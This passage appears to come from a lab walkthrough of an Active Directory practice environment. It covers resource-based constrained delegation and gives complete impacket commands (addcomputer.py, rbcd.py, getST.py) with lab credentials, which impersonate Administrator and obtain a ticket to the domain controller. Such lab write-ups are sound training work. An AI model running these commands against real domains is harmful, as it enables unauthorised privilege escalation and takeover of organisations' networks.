  → S4U2self + S4U2Proxy succeed → `administrator@CIFS_winterfell…ccache`. Then

## Step 3 - Resource-Based Constrained Delegation (RBCD)

- [x] stannis.baratheon has `GenericWrite` on kingslanding:
  ```
  addcomputer.py -computer-name 'rbcd$' -computer-pass rbcdpass -dc-ip 192.168.56.10 sevenkingdoms.local/stannis.baratheon:Drag0nst0ne
  rbcd.py -delegate-from 'rbcd$' -delegate-to 'kingslanding$' -action write -dc-ip 192.168.56.10 sevenkingdoms.local/stannis.baratheon:Drag0nst0ne
  getST.py -spn cifs/kingslanding.sevenkingdoms.local -impersonate Administrator -dc-ip 192.168.56.10 sevenkingdoms.local/rbcd$:rbcdpass
  ```
  → `Delegation rights modified successfully!` → admin ticket to the
  **sevenkingdoms DC**. `wmiexec -k` negotiates SMBv3. `✅`
